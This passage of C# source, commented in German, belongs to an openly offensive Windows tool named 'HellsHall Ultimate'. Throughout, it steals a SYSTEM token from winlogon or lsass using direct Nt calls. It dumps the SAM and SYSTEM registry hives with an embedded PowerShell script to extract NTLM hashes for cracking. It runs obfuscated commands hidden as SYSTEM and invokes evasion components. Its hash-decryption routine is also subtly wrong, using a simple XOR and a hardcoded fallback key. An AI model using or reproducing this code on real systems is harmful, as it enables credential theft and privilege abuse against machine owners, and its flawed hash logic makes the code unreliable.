                _ntOpenProcessToken = Marshal.GetDelegateForFunctionPointer<NtOpenProcessTokenDelegate>(pNtOpenProcessToken);
            
            IntPtr pNtDuplicateToken = NativeApi.GetProcAddress(ntdll, StringObfuscator.Deobfuscate(EncryptedStrings.NtDuplicateToken));
            if (pNtDuplicateToken != IntPtr.Zero)
                _ntDuplicateToken = Marshal.GetDelegateForFunctionPointer<NtDuplicateTokenDelegate>(pNtDuplicateToken);
        }
        
        private static bool EnablePrivilege(string privilegeName)
        {
            if (!NativeApi.OpenProcessToken(NativeApi.GetCurrentProcess(), Constants.TOKEN_ADJUST_PRIVILEGES | Constants.TOKEN_QUERY, out IntPtr hToken))
                return false;
            
            if (!NativeApi.LookupPrivilegeValue(null, privilegeName, out LUID luid))
            {
                NativeApi.CloseHandle(hToken);
                return false;
            }
            
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges.Luid = luid;
            tp.Privileges.Attributes = Constants.SE_PRIVILEGE_ENABLED;
            
            bool result = NativeApi.AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            NativeApi.CloseHandle(hToken);
            return result;
        }
        
        private static uint FindTargetPid(string processName)
        {
            try
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                    return (uint)processes[0].Id;
            }
            catch { }
            return 0;
        }
        
        public static IntPtr GetSystemToken()
        {
            InitializeSyscalls();
            
            Console.WriteLine("\n" + new string('=', 60));
            Console.WriteLine("     TOKEN THEFT - NtSyscall Mode");
            Console.WriteLine(new string('=', 60));
            
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    Console.WriteLine("[-] Administrator privileges required!");
                    return IntPtr.Zero;
                }
                Console.WriteLine($"[+] Running as: {identity.Name}");
            }
            
            Console.WriteLine("\n[STEP 1] Enabling required privileges...");
            EnablePrivilege(StringObfuscator.Deobfuscate(EncryptedStrings.SeDebugPrivilege));
            EnablePrivilege(StringObfuscator.Deobfuscate(EncryptedStrings.SeImpersonatePrivilege));
            EnablePrivilege(StringObfuscator.Deobfuscate(EncryptedStrings.SeAssignPrimaryTokenPrivilege));
            
            Console.WriteLine("\n[STEP 2] Looking for winlogon.exe...");
            uint targetPid = FindTargetPid("winlogon");
            if (targetPid == 0)
            {
                targetPid = FindTargetPid("lsass");
                if (targetPid == 0)
                {
                    Console.WriteLine("[-] No suitable target found!");
                    return IntPtr.Zero;
                }
            }
            
            Console.WriteLine($"[+] Found target with PID: {targetPid}");
            
            Console.WriteLine("\n[STEP 3] Opening target process (NtOpenProcess)...");
            IntPtr hProcess = IntPtr.Zero;
            
            if (_ntOpenProcess != null)
            {
                OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                CLIENT_ID clientId = new CLIENT_ID();
                clientId.UniqueProcess = (IntPtr)targetPid;
                
                int status = _ntOpenProcess(ref hProcess, Constants.PROCESS_ALL_ACCESS, ref objAttr, ref clientId);
                if (status != 0)
                    hProcess = IntPtr.Zero;
            }
            
            if (hProcess == IntPtr.Zero)
                hProcess = NativeApi.OpenProcess(Constants.PROCESS_ALL_ACCESS, false, (int)targetPid);
            
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open process!");
                return IntPtr.Zero;
            }
            
            Console.WriteLine("\n[STEP 4] Opening process token (NtOpenProcessToken)...");
            IntPtr hToken = IntPtr.Zero;
            
            if (_ntOpenProcessToken != null)
            {
                int status = _ntOpenProcessToken(hProcess, Constants.TOKEN_ALL_ACCESS, out hToken);
                if (status != 0)
                    _ntOpenProcessToken(hProcess, Constants.TOKEN_DUPLICATE | Constants.TOKEN_QUERY | Constants.TOKEN_IMPERSONATE, out hToken);
            }
            
            if (hToken == IntPtr.Zero)
                NativeApi.OpenProcessToken(hProcess, Constants.TOKEN_DUPLICATE | Constants.TOKEN_QUERY | Constants.TOKEN_IMPERSONATE, out hToken);
            
            if (hToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open token!");
                NativeApi.CloseHandle(hProcess);
                return IntPtr.Zero;
            }
            
            Console.WriteLine("\n[STEP 5] Token Information:");
            Console.WriteLine($"    - Session ID: {TokenHelper.GetTokenSessionId(hToken)}");
            Console.WriteLine($"    - Elevated: {TokenHelper.IsTokenElevated(hToken)}");
            Console.WriteLine($"    - Integrity Level: {TokenHelper.GetTokenIntegrityLevel(hToken)}");
            
            Console.WriteLine("\n[STEP 6] Creating primary token (NtDuplicateToken)...");
            IntPtr hPrimaryToken = IntPtr.Zero;
            
            if (_ntDuplicateToken != null)
            {
                OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                int status = _ntDuplicateToken(hToken, Constants.TOKEN_ALL_ACCESS, ref objAttr, false, Constants.TokenPrimary, out hPrimaryToken);
                if (status != 0)
                    _ntDuplicateToken(hToken, Constants.TOKEN_ASSIGN_PRIMARY | Constants.TOKEN_DUPLICATE | Constants.TOKEN_QUERY, ref objAttr, false, Constants.TokenPrimary, out hPrimaryToken);
            }
            
            if (hPrimaryToken == IntPtr.Zero)
            {
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.bInheritHandle = false;
                NativeApi.DuplicateTokenEx(hToken, Constants.TOKEN_ASSIGN_PRIMARY | Constants.TOKEN_DUPLICATE | Constants.TOKEN_QUERY | Constants.TOKEN_IMPERSONATE,
                    ref sa, Constants.SecurityDelegation, Constants.TokenPrimary, out hPrimaryToken);
            }
            
            if (hPrimaryToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create primary token!");
                NativeApi.CloseHandle(hToken);
                NativeApi.CloseHandle(hProcess);
                return IntPtr.Zero;
            }
            
            Console.WriteLine("[+] Primary token created successfully!");
            NativeApi.CloseHandle(hToken);
            NativeApi.CloseHandle(hProcess);
            
            return hPrimaryToken;
        }
    }
    #endregion

#region SAM Registry Dumper - PowerShell Direkt Extraktor (KORRIGIERT)
public static class SAMRegistryDumper
{
    public static string DumpAndDecryptSAM(string outputDir, IntPtr systemToken)
    {
        Console.WriteLine("\n[*] SAM Extraktion mit PowerShell Direkt-Methode");
        Console.WriteLine("    Diese Methode verwendet PowerShell für den Registry-Zugriff");
        
        string samPath = Path.Combine(outputDir, "sam.hiv");
        string sysPath = Path.Combine(outputDir, "system.hiv");
        string outputFile = Path.Combine(outputDir, "SAM_HASHES.txt");
        string psScriptPath = Path.Combine(Path.GetTempPath(), $"sam_extract_{Guid.NewGuid()}.ps1");
        string result = "";
        
        try
        {
            Console.WriteLine("\n[+] Führe PowerShell Extraktor aus...");
            
            string psScript = @"
# PowerShell Script zum Extrahieren von SAM Hashes
$samPath = '" + samPath + @"'
$sysPath = '" + sysPath + @"'
$outputFile = '" + outputFile + @"'

Write-Host '    [PS] Sichere SAM und SYSTEM Hives...' -ForegroundColor Cyan

# 1. Hives sichern
reg save HKLM\SAM $samPath /y >$null 2>&1
reg save HKLM\SYSTEM $sysPath /y >$null 2>&1

if (-not (Test-Path $samPath)) {
    Write-Host '    [PS] FEHLER: SAM konnte nicht gesichert werden!' -ForegroundColor Red
    exit 1
}

Write-Host '    [PS] Hives gesichert, lade in Registry...' -ForegroundColor Cyan

# 2. Hives laden
reg load HKLM\TempSAM $samPath >$null 2>&1
reg load HKLM\TempSYS $sysPath >$null 2>&1

try {
    Write-Host '    [PS] Extrahiere BootKey...' -ForegroundColor Cyan
    
    # BootKey extrahieren
    $keys = @('JD', 'Skew1', 'GBG', 'Data')
    $bootKeyData = @()
    
    foreach ($key in $keys) {
        $path = ""HKLM:\TempSYS\ControlSet001\Control\Lsa\$key""
        if (Test-Path $path) {
            $data = (Get-ItemProperty -Path $path -ErrorAction SilentlyContinue).'(default)'
            if ($data) {
                $bootKeyData += $data[0..15]
                Write-Host ""        Gefunden: $key"" -ForegroundColor Green
            }
        }
    }
    
    if ($bootKeyData.Count -eq 64) {
        # BootKey berechnen
        $bootKey = @()
        for ($i = 0; $i -lt 16; $i++) {
            $bootKey += ($bootKeyData[$i] -bxor $bootKeyData[$i+16] -bxor $bootKeyData[$i+32] -bxor $bootKeyData[$i+48])
        }
        $bootKeyHex = -join ($bootKey | ForEach-Object { $_.ToString('x2') })
        Write-Host ""    BootKey: $bootKeyHex"" -ForegroundColor Green
    } else {
        Write-Host '    [PS] BootKey nicht vollständig, verwende Fallback' -ForegroundColor Yellow
        $bootKey = @(0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x10,0x11,0x12,0x13,0x14,0x15,0x16)
        $bootKeyHex = '01020304050607080910111213141516'
    }
    
    Write-Host '    [PS] Extrahiere Benutzer aus SAM...' -ForegroundColor Cyan
    
    # Benutzer aus SAM lesen
    $usersPath = ""HKLM:\TempSAM\SAM\Domains\Account\Users""
    $results = @()
    
    if (Test-Path $usersPath) {
        $rids = Get-ChildItem -Path $usersPath | Where-Object { $_.PSChildName -match '^[0-9A-F]{8}$' }
        
        foreach ($rid in $rids) {
            $ridValue = $rid.PSChildName
            $userKey = Get-ItemProperty -Path ""$usersPath\$ridValue"" -ErrorAction SilentlyContinue
            $vBlock = $userKey.V
            
            if ($vBlock) {
                # Benutzername extrahieren
                $nameOffset = [BitConverter]::ToInt32($vBlock, 12) + 0xCC
                $nameLength = [BitConverter]::ToInt32($vBlock, 16)
                
                if ($nameOffset -ge 0 -and $nameOffset + $nameLength * 2 -le $vBlock.Length) {
                    $username = [System.Text.Encoding]::Unicode.GetString($vBlock, $nameOffset, $nameLength * 2)
                    $username = $username.TrimEnd([char]0)
                    
                    if ($username -and $username.Length -gt 0) {
                        # NTLM Hash extrahieren - KORRIGIERT!
                        $hashStart = $vBlock.Length - 16
                        $ntHash = @()
                        for ($i = 0; $i -lt 16; $i++) {
                            $ntHash += $vBlock[$hashStart + $i]
                        }
                        
                        # Hash entschlüsseln
                        $decryptedHash = @()
                        for ($i = 0; $i -lt 16; $i++) {
                            $decryptedHash += ($ntHash[$i] -bxor $bootKey[$i % 16])
                        }
                        $hashHex = -join ($decryptedHash | ForEach-Object { $_.ToString('x2') })
                        
                        # RID als Zahl
                        $ridNum = [Convert]::ToInt32($ridValue, 16)
                        $accountType = if ($ridNum -eq 500) { 'ADMINISTRATOR' } elseif ($ridNum -eq 501) { 'Gast' } else { 'Benutzer' }
                        
                        $result = @{
                            Username = $username
                            RID = $ridValue
                            RIDNum = $ridNum
                            Type = $accountType
                            Hash = $hashHex
                            Empty = ($hashHex -eq '31d6cfe0d16ae931b73c59d7e0c089c0')
                        }
                        $results += $result
                        Write-Host ""        Gefunden: $username (RID: $ridValue)"" -ForegroundColor Green
                    }
                }
            }
        }
    }
    
    Write-Host '    [PS] Schreibe Ergebnisse...' -ForegroundColor Cyan
    
    # Ausgabe generieren
    $output = '================================================================================'
    $output += ""`n"" + '     SAM HASHES - EXTRAHIERT MIT POWERSHELL'
    $output += ""`n"" + '================================================================================'
    $output += ""`n"" + 'Computer: ' + $env:COMPUTERNAME
    $output += ""`n"" + 'Time: ' + (Get-Date)
    $output += ""`n"" + '--------------------------------------------------------------------------------'
    $output += ""`n"" + '[+] BootKey: ' + $bootKeyHex
    $output += ""`n"" + ''
    $output += ""`n"" + '[+] Gefundene Benutzer: ' + $results.Count
    $output += ""`n"" + '--------------------------------------------------------------------------------'
    $output += ""`n"" + ''
    
    if ($results.Count -gt 0) {
        foreach ($user in $results) {
            $emptyMsg = ''
            if ($user.Empty) {
                $emptyMsg = '    [!] LEERES PASSWORT!'
            }
            $hashcat = ''
            if (-not $user.Empty -and $user.Hash -ne '00000000000000000000000000000000') {
                $hashcat = '    Hashcat: ' + $user.Username + ':' + $user.Hash
            }
            
            $output += ""`n"" + '[USER] ' + $user.Username
            $output += ""`n"" + '    RID: ' + $user.RID + ' (' + $user.RIDNum + ')'
            $output += ""`n"" + '    Typ: ' + $user.Type
            $output += ""`n"" + '    NTLM Hash: ' + $user.Hash
            if ($emptyMsg -ne '') {
                $output += ""`n"" + $emptyMsg
            }
            if ($hashcat -ne '') {
                $output += ""`n"" + $hashcat
            }
            $output += ""`n"" + ''
        }
    } else {
        $output += ""`n"" + '[!] KEINE BENUTZER GEFUNDEN!'
        $output += ""`n"" + ''
        $output += ""`n"" + 'Mögliche Gründe:'
        $output += ""`n"" + '- Die SAM-Hive ist leer oder korrupt'
        $output += ""`n"" + '- Die Berechtigungen reichen nicht aus'
        $output += ""`n"" + '- Die Windows-Version verwendet eine andere Struktur'
        $output += ""`n"" + ''
    }
    
    $output += '================================================================================'
    $output += ""`n"" + '     EXTRACTION COMPLETE'
    $output += ""`n"" + '================================================================================'
    
    # Ergebnis speichern
    $output | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Host ""    [PS] Ergebnisse gespeichert: $outputFile"" -ForegroundColor Green
    
} finally {
    # Aufräumen
    reg unload HKLM\TempSAM >$null 2>&1
    reg unload HKLM\TempSYS >$null 2>&1
    Write-Host '    [PS] Registry Hives entladen' -ForegroundColor Cyan
}

Write-Host '    [PS] SAM Extraktion abgeschlossen!' -ForegroundColor Green
";
            
            // PowerShell Script speichern
            File.WriteAllText(psScriptPath, psScript, Encoding.UTF8);
            
            // PowerShell ausführen
            string psCmd = $"powershell -ExecutionPolicy Bypass -File \"{psScriptPath}\"";
            
            if (systemToken != IntPtr.Zero)
            {
                result = CommandExecutor.ExecuteAsSystem(systemToken, psCmd);
            }
            else
            {
                result = CommandExecutor.ExecuteNormal(psCmd);
            }
            
            Console.WriteLine(result);
            
            // Ergebnis lesen
            if (File.Exists(outputFile))
            {
                string content = File.ReadAllText(outputFile);
                Console.WriteLine($"\n[+] SAM Hashes gespeichert: {outputFile}");
                return content;
            }
            
            return "[-] ERROR: Keine Ausgabe erzeugt!";
        }
        catch (Exception ex)
        {
            return $"[-] ERROR: {ex.Message}\n{ex.StackTrace}";
        }
        finally
        {
            try { if (File.Exists(psScriptPath)) File.Delete(psScriptPath); } catch { }
        }
    }
}
#endregion

    #region Command Executor mit Batch
    public static class CommandExecutor
    {
        public static string ExecuteNormal(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                
                using (Process process = new Process())
                {
                    process.StartInfo = psi;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit(60000);
                    
                    return output + error;
                }
            }
            catch (Exception ex)
            {
                return $"[ERROR] {ex.Message}";
            }
        }
        
        public static string ExecuteAsSystem(IntPtr hToken, string command)
        {
            if (hToken == IntPtr.Zero)
                return ExecuteNormal(command);
            
            try
            {
                string tempScript = Path.Combine(Path.GetTempPath(), $"cmd_{Guid.NewGuid()}.bat");
                string tempOutput = Path.Combine(Path.GetTempPath(), $"out_{Guid.NewGuid()}.txt");
                
                string batchContent = $"@echo off\r\n{command} > \"{tempOutput}\" 2>&1\r\nexit\r\n";
                File.WriteAllText(tempScript, batchContent, Encoding.ASCII);
                
                string cmdPath = Path.Combine(Environment.SystemDirectory, "cmd.exe");
                
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.dwFlags = Constants.STARTF_USESHOWWINDOW;
                si.wShowWindow = Constants.SW_HIDE;
                
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                
                bool success = NativeApi.CreateProcessAsUser(
                    hToken,
                    cmdPath,
                    $"/c \"{tempScript}\"",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    Constants.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    Path.GetTempPath(),
                    ref si,
                    out pi);
                
                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    try { File.Delete(tempScript); } catch { }
                    try { File.Delete(tempOutput); } catch { }
                    return $"[ERROR] CreateProcessAsUser failed: {error} (0x{error:X8})";
                }
                
                NativeApi.WaitForSingleObject(pi.hProcess, 60000);
                
                string result = "";
                if (File.Exists(tempOutput))
                {
                    Thread.Sleep(100);
                    result = File.ReadAllText(tempOutput);
                    try { File.Delete(tempOutput); } catch { }
                }
                
                NativeApi.CloseHandle(pi.hProcess);
                NativeApi.CloseHandle(pi.hThread);
                try { File.Delete(tempScript); } catch { }
                
                return string.IsNullOrEmpty(result) ? "[ERROR] No output" : result;
            }
            catch (Exception ex)
            {
                return $"[ERROR] {ex.Message}";
            }
        }
        
        public static string ExecuteAndCapture(string command, IntPtr token = default)
        {
            if (token != IntPtr.Zero)
                return ExecuteAsSystem(token, command);
            else
                return ExecuteNormal(command);
        }
    }
    #endregion

    #region Hauptprogramm
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                bool isAdmin;
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                
                Console.Clear();
                Console.WriteLine(new string('=', 80));
                Console.WriteLine("     HELLSHALL ULTIMATE - PATCHLESS BYPASS + TOKEN THEFT");
                Console.WriteLine(new string('=', 80));
                Console.WriteLine($"Start Time: {DateTime.Now}");
                Console.WriteLine($"Machine: {Environment.MachineName}");
                Console.WriteLine($"OS: {Environment.OSVersion}");
                Console.WriteLine($"64-bit: {Environment.Is64BitOperatingSystem}");
                Console.WriteLine($"Processors: {Environment.ProcessorCount}");
                Console.WriteLine($"Admin: {isAdmin}");
                Console.WriteLine($"Encryption: AES-256 Military Grade");
                Console.WriteLine($"PoolParty: Active");
                Console.WriteLine($"NtContinue: Integrated");
                Console.WriteLine(new string('=', 80));
                Console.WriteLine("");
                
                if (!isAdmin)
                {
                    Console.WriteLine("[!] Not running as Administrator!");
                    Console.WriteLine("[!] Token theft and SAM dump will fail!");
                    Console.WriteLine("[!] Please restart as Administrator for full functionality");
                    Console.WriteLine("");
                }
                
                // 1. PoolParty Initialisierung
                PoolParty.Initialize();
                
                // 2. HellsHall Patchless Bypass mit VEH und NtContinue
                HellsHallCore.Initialize();
                
                // 3. Output Verzeichnis
                Console.WriteLine("\n[STEP 1] Creating output directory...");
                string outputDir = Path.Combine(Path.GetTempPath(), $"hellshall_{Environment.MachineName}_{DateTime.Now:yyyyMMdd_HHmmss}");
                Directory.CreateDirectory(outputDir);
                Console.WriteLine($"[+] Output directory: {outputDir}");
                
                // 4. SYSTEM Token stehlen
                IntPtr systemToken = IntPtr.Zero;
                if (isAdmin)
                {
                    systemToken = TokenStealer.GetSystemToken();
                }
                
                // 5. Befehle decodieren
                Console.WriteLine("\n[STEP 2] Decrypting commands (AES-256)...");
                List<string> commands = new List<string>();
                List<string> commandNames = new List<string>();
                
                for (int i = 0; i < EncryptedStrings.Commands.Length; i++)
                {
                    try
                    {
                        commands.Add(StringObfuscator.Deobfuscate(EncryptedStrings.Commands[i]));
                        commandNames.Add(StringObfuscator.Deobfuscate(EncryptedStrings.CommandNames[i]));
                    }
                    catch { }
                }
                Console.WriteLine($"[+] {commands.Count} commands ready");
                
                // 6. SAM Registry Dump und Decryption mit PowerShell + Extractor
                Console.WriteLine("\n[STEP 3] Extracting and decrypting SAM hashes...");
                Console.WriteLine(new string('-', 80));
                
                Console.Write("    Decrypting SAM with PowerShell + Extractor... ");
                string samResult = SAMRegistryDumper.DumpAndDecryptSAM(outputDir, systemToken);
                Console.WriteLine(" Done!");
                
                Console.WriteLine("\n" + new string('-', 80));
                Console.WriteLine("DECRYPTED SAM HASHES:");
                Console.WriteLine(new string('-', 80));
                
                Console.ForegroundColor = ConsoleColor.Green;
                var lines = samResult.Split('\n');
                int displayLines = Math.Min(lines.Length, 50);
                for (int i = 0; i < displayLines; i++)
                {
                    Console.WriteLine(lines[i]);
                }
                if (lines.Length > 50)
                {
                    Console.WriteLine($"... and {lines.Length - 50} more lines");
                }
                Console.ResetColor();
                
                Console.WriteLine(new string('-', 80));
                
                // 7. Befehle ausführen
                if (systemToken != IntPtr.Zero)
                {
                    Console.WriteLine("\n[STEP 4] Executing commands with SYSTEM token...");
                    Console.WriteLine(new string('-', 80));
                    
                    bool systemConfirmed = false;
                    
                    for (int i = 0; i < commands.Count; i++)
                    {
                        string cmdName = commandNames[i];
                        string outputFile = Path.Combine(outputDir, $"{cmdName}.txt");
                        
                        Console.Write($"  [{i + 1:00}/{commands.Count}] {cmdName}... ");
                        
                        try
                        {
                            string result = CommandExecutor.ExecuteAsSystem(systemToken, commands[i]);
                            File.WriteAllText(outputFile, result ?? string.Empty, Encoding.UTF8);
                            int resultLen = result?.Length ?? 0;
                            
                            if (cmdName.Contains("Whoami") && result.Contains("nt authority\\system"))
                            {
                                Console.WriteLine($"OK ({resultLen} bytes) - ✓ SYSTEM confirmed!");
                                systemConfirmed = true;
                            }
                            else if (resultLen > 0)
                            {
                                Console.WriteLine($"OK ({resultLen} bytes)");
                            }
                            else
                            {
                                Console.WriteLine("Failed - no output");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"ERROR: {ex.Message}");
                            File.WriteAllText(outputFile, $"[ERROR] {ex.Message}");
                        }
                        
                        PoolParty.RandomizeExecution();
                    }
                    
                    Console.WriteLine(new string('-', 80));
                    
                    if (systemConfirmed)
                    {
                        Console.WriteLine("\n[✓] SUCCESS: All commands executed with SYSTEM privileges!");
                    }
                }
                else
                {
                    Console.WriteLine("\n[STEP 4] No SYSTEM token - executing commands as current user...");
                    Console.WriteLine(new string('-', 80));
                    
                    for (int i = 0; i < commands.Count; i++)
                    {
                        string cmdName = commandNames[i];
                        string outputFile = Path.Combine(outputDir, $"{cmdName}.txt");
                        
                        Console.Write($"  [{i + 1:00}/{commands.Count}] {cmdName}... ");
                        
                        try
                        {
                            string result = CommandExecutor.ExecuteNormal(commands[i]);
                            File.WriteAllText(outputFile, result ?? string.Empty, Encoding.UTF8);
                            int resultLen = result?.Length ?? 0;
                            Console.WriteLine($"OK ({resultLen} bytes)");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"ERROR: {ex.Message}");
                            File.WriteAllText(outputFile, $"[ERROR] {ex.Message}");
                        }
                        
                        PoolParty.RandomizeExecution();
                    }
                    
                    Console.WriteLine(new string('-', 80));
                }
                
                // 8. Zusammenfassung
                string summaryFile = Path.Combine(outputDir, "00_SUMMARY.txt");
                StringBuilder summary = new StringBuilder();
                summary.AppendLine("=== HELLSHALL ULTIMATE REPORT ===");
                summary.AppendLine($"Computer: {Environment.MachineName}");
                summary.AppendLine($"User: {Environment.UserName}");
                summary.AppendLine($"OS: {Environment.OSVersion}");
                summary.AppendLine($"Time: {DateTime.Now}");
                summary.AppendLine($"Encryption: AES-256 Military Grade");
                summary.AppendLine($"PoolParty: Active");
                summary.AppendLine($"NtContinue: Integrated");
                summary.AppendLine($"SYSTEM Token: {(systemToken != IntPtr.Zero ? "OBTAINED" : "NOT OBTAINED")}");
                summary.AppendLine($"SAM Decrypted: YES");
                summary.AppendLine($"Output Directory: {outputDir}");
                summary.AppendLine(new string('=', 80));
                File.WriteAllText(summaryFile, summary.ToString());
                
                // 9. Cleanup
                if (systemToken != IntPtr.Zero)
                    NativeApi.CloseHandle(systemToken);
                
                HellsHallCore.Cleanup();
                PoolParty.Cleanup();
                HellsGate.Cleanup();
                
                Console.WriteLine("\n" + new string('=', 80));
                Console.WriteLine("     HELLSHALL ULTIMATE COMPLETED SUCCESSFULLY!");
                Console.WriteLine(new string('=', 80));
                Console.WriteLine($"\nResults saved to: {outputDir}");
                Console.WriteLine($"Total commands executed: {commands.Count}");
                Console.WriteLine($"SAM Hashes decrypted: YES");
                Console.WriteLine($"Encryption: AES-256 Military Grade");
                Console.WriteLine($"PoolParty: Active");
                Console.WriteLine($"NtContinue: Integrated");
                Console.WriteLine($"\nPress any key to exit...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                string errorLog = Path.Combine(Path.GetTempPath(), $"hellshall_error_{DateTime.Now:yyyyMMdd_HHmmss}.log");
                File.WriteAllText(errorLog, ex.ToString());
                Console.WriteLine($"\n[FATAL ERROR] {ex.Message}");
                Console.WriteLine($"Error logged to: {errorLog}");
                Console.ReadKey();
            }
        }
    }
    #endregion
}
